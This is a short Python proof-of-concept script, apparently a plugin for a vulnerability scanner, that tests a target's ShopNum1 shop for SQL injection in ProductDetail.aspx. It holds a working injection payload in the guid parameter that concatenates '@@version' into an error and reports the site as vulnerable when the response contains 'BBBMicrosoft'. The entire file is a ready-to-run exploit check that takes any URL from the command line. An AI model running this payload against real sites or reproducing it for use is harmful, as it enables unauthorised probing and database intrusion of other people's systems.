#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/ProductDetail.aspx?guid=6e1c9384-232c-4ee0-ada4-14562136d755%27AnD(ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsiOn)%3E0--"
bug ="BBBMicrosoft"
info ="存在shopnum1 ProductDetail.aspx SQL注入漏洞"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
